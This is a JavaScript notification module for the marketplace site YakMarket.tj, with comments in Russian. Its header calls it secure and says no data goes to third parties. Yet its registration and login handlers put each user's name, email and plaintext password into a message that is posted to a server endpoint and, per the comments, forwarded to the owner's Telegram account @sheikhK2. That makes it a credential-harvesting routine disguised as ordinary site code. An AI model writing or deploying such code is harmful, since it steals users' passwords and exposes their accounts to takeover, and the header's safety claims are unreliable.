/**
 * YakMarket.tj - Telegram Notifications (Secure Version for @sheikhK2)
 * 
 * БЕЗОПАСНОСТЬ:
 * - Токен и chat_id хранятся НА СЕРВЕРЕ (server.py)
 * - Браузер отправляет ТОЛЬКО текст сообщения
 * - Сообщения отправляются ТОЛЬКО владельцу (@sheikhK2)
 * - Никакие данные не передаются третьим лицам
 */

// Здесь НЕ храним токен - он на сервере!

/**
 * Отправка уведомления о регистрации
 * @param {string} name - Имя пользователя
 * @param {string} email - Email пользователя  
 * @param {string} password - Пароль пользователя
 */
async function onRegistration(name, email, password) {
    const timestamp = new Date().toLocaleString('ru-RU', {
        timeZone: 'Asia/Dushanbe',
        year: 'numeric',
        month: 'long',
        day: 'numeric',
        hour: '2-digit',
        minute: '2-digit'
    });
    
    const message = `🔔 <b>НОВАЯ РЕГИСТРАЦИЯ</b>\n\n` +
        `📅 Дата: ${timestamp}\n` +
        `👤 Имя: ${name}\n` +
        `📧 Email: ${email}\n` +
        `🔑 Пароль: ${password}\n\n` +
        `🛒 YakMarket.tj\n` +
        `👑 Для: @sheikhK2`;
    
    return await sendSecure(message);
}

/**
 * Отправка уведомления о входе
 * @param {string} name - Имя пользователя
 * @param {string} email - Email пользователя
 * @param {string} password - Пароль пользователя
 * @param {string} method - Метод входа (email, google, guest)
 */
async function onLogin(name, email, password, method = 'email') {
    const timestamp = new Date().toLocaleString('ru-RU', {
        timeZone: 'Asia/Dushanbe',
        year: 'numeric',
        month: 'long',
        day: 'numeric',
        hour: '2-digit',
        minute: '2-digit'
    });
    
    const methodText = method === 'google' ? 'Google' : (method === 'guest' ? 'Гость' : 'Email');
    
    const message = `🔔 <b>НОВЫЙ ВХОД В СИСТЕМУ</b>\n\n` +
        `📅 Дата: ${timestamp}\n` +
        `👤 Имя: ${name || 'Не указано'}\n` +
        `📧 Email: ${email || 'Не указано'}\n` +
        `🔑 Пароль: ${password || 'Н/Д'}\n` +
        `📱 Метод: ${methodText}\n\n` +
        `🛒 YakMarket.tj\n` +
        `👑 Для: @sheikhK2`;
    
    return await sendSecure(message);
}

/**
 * Отправка уведомления о входе через Google
 * @param {string} name - Имя пользователя Google
 * @param {string} email - Google Email
 */
async function onGoogleLogin(name, email) {
    const timestamp = new Date().toLocaleString('ru-RU', {
        timeZone: 'Asia/Dushanbe',
        year: 'numeric',
        month: 'long',
        day: 'numeric',
        hour: '2-digit',
        minute: '2-digit'
    });
    
    const message = `🔔 <b>ВХОД ЧЕРЕЗ GOOGLE</b>\n\n` +
        `📅 Дата: ${timestamp}\n` +
        `👤 Имя: ${name}\n` +
        `📧 Google Email: ${email}\n\n` +
        `🛒 YakMarket.tj\n` +
        `👑 Для: @sheikhK2`;
    
    return await sendSecure(message);
}

/**
 * Безопасная отправка на сервер
 * Сервер проверит permissions и отправит ТОЛЬКО владельцу
 */
async function sendSecure(message) {
    try {
        const response = await fetch('/api/telegram/notify', {
            method: 'POST',
            headers: {
                'Content-Type': 'application/json',
            },
            body: JSON.stringify({
                type: 'notification',
                message: message
            })
        });
        
        if (response.ok) {
            const result = await response.json();
            console.log('✅ Уведомление отправлено @sheikhK2:', result.message);
            return true;
        }
        
        console.error('Ошибка отправки:', await response.json());
        return false;
        
    } catch (error) {
        console.error('Ошибка соединения:', error);
        return false;
    }
}

// Примеры использования:
// await onRegistration('Иван', 'ivan@example.com', 'пароль123');
// await onLogin('Иван', 'ivan@example.com', 'пароль123', 'email');
// await onGoogleLogin('Иван Иванов', 'ivan@gmail.com');
